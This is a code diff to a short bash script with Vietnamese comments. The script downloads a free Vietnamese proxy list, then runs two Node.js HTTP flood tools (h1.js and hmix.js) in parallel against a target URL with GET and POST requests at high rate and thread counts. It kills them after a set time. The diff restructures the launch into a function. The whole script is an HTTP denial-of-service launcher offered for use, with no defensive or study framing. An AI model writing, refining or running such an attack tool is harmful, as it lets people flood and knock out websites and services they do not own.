@@ -8,17 +8,17 @@ THREADS=10
 RATE=999
 PFILE="hihi.txt"
 
-# Tải proxy 1 lần
+# Tải proxy 1 lần tránh curl delay
 curl -s 'https://api.proxyscrape.com/v4/free-proxy-list/get?request=display_proxies&proxy_format=ipport&format=text&country=vn&ssl=all&anonymity=all&timeout=9999' | sort -u > live.txt
 
-# Chạy tấn công song song cho GET và POST
-for METHOD in GET POST; do
-    node h1.js "$METHOD" "$URL" live.txt "$TIME" "$RATE" "$THREADS" randomstring=true &
-    PIDS+=($!)
-    node hmix.js -m "$METHOD" -u "$URL" -s "$TIME" -p "$PFILE" -t "$THREADS" -r "$RATE" --full true -d false &
-    PIDS+=($!)
-done
+# Chạy attack với 1 phương thức
+attack_method() {
+  METHOD=$1
+  node h1.js "$METHOD" "$URL" live.txt "$TIME" "$RATE" "$THREADS" randomstring=true & PID1=$!
+  node hmix.js -m "$METHOD" -u "$URL" -s "$TIME" -p "$PFILE" -t "$THREADS" -r "$RATE" --full true -d false & PID2=$!
+  sleep "$TIME"; kill -9 $PID1 $PID2 2>/dev/null
+}
 
-# Đợi và kill sau TIME
-sleep "$TIME"
-kill -9 "${PIDS[@]}" 2>/dev/null
+# Chạy GET và POST song song
+attack_method GET &
+attack_method POST &
